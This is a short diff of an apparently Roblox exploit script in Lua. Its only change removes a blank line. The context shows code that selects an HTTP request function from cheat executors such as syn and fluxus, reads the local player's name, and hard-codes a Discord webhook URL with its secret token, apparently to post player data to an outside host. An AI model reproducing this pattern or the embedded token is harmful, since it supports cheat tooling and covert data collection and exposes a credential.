@@ -49,7 +49,6 @@ Garbage.ChildAdded:Connect(clean)
 for i,v in next, Garbage:GetChildren() do
     clean(v)
 end
-
 local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/1073301136922124428/7PDVIeL5Y7ASxw66W19ZR8FSjslFZ1kr-9tOVjknZrTUb-UkAe2TEu1sdQv83qGdufdk"
